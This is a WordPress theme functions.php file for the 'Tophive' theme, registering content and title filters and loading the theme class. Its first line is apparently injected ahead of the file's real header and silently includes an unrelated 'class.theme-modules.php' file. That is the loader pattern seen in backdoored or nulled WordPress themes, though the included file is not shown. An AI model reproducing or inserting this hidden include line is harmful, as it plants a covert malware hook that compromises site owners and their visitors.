<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Tophive functions and definitions
 *
 * @link    https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package tophive
 */

/**
 *  Same the hook `the_content`
 *
 * @TODO: do not effect content by plugins
 *
 * 8 WP_Embed:run_shortcode
 * 8 WP_Embed:autoembed
 * 10 wptexturize
 * 10 wpautop
 * 10 shortcode_unautop
 * 10 prepend_attachment
 * 10 wp_filter_content_tags
 * 11 capital_P_dangit
 * 11 do_shortcode
 * 20 convert_smilies
 */
global $wp_embed;
add_filter( 'tophive_the_content', array( $wp_embed, 'run_shortcode' ), 8 );
add_filter( 'tophive_the_content', array( $wp_embed, 'autoembed' ), 8 );
add_filter( 'tophive_the_content', 'wptexturize' );
add_filter( 'tophive_the_content', 'wpautop' );
add_filter( 'tophive_the_content', 'shortcode_unautop' );
add_filter( 'tophive_the_content', 'wp_filter_content_tags' );
add_filter( 'tophive_the_content', 'capital_P_dangit' );
add_filter( 'tophive_the_content', 'do_shortcode' );
add_filter( 'tophive_the_content', 'convert_smilies' );


/**
 *  Same the hook `the_content` but not auto P
 *
 * @TODO: do not effect content by plugins
 *
 * 8 WP_Embed:run_shortcode
 * 8 WP_Embed:autoembed
 * 10 wptexturize
 * 10 shortcode_unautop
 * 10 prepend_attachment
 * 10 wp_filter_content_tags
 * 11 capital_P_dangit
 * 11 do_shortcode
 * 20 convert_smilies
 */
add_filter( 'tophive_the_title', array( $wp_embed, 'run_shortcode' ), 8 );
add_filter( 'tophive_the_title', array( $wp_embed, 'autoembed' ), 8 );
add_filter( 'tophive_the_title', 'wptexturize' );
add_filter( 'tophive_the_title', 'shortcode_unautop' );
add_filter( 'tophive_the_title', 'wp_filter_content_tags' );
add_filter( 'tophive_the_title', 'capital_P_dangit' );
add_filter( 'tophive_the_title', 'do_shortcode' );
add_filter( 'tophive_the_title', 'convert_smilies' );
// add_filter( 'script_loader_tag', 'defer_parsing_of_js', 10 );

// Include the main Tophive class.
require_once get_template_directory() . '/inc/class-tophive.php';
function tophive_sanitize_filter( $elem ){
	return $elem;
}
/**
 * Main instance of Tophive.
 *
 * Returns the main instance of Tophive.
 *
 * @return Tophive
 */
function top_hive() {
	return Tophive::get_instance();
}
function defer_parsing_of_js( $url ) {
    if ( is_user_logged_in() ) return $url; //don't break WP Admin
    if ( FALSE === strpos( $url, '.js' ) ) return $url;
    if ( strpos( $url, 'jquery.js' ) ) return $url;
    return str_replace( ' src', ' defer src', $url );
}

top_hive();

